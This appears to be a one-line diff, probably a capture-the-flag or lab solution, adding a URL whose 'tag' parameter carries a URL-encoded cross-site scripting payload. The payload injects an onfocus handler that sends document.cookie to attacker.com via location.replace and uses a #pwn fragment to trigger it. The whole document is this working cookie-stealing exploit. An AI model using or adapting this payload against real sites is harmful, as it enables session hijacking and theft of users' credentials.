@@ -1,0 +1,1 @@
+http://52.52.236.217:16401/?tag=attrs%3Dhref%3D%23%2526onfocus%3Dlocation.replace%28%27https%3A//attacker.com/%3F%27+encodeURI%28document.cookie%29%29%2526name%3Dpwn#pwn
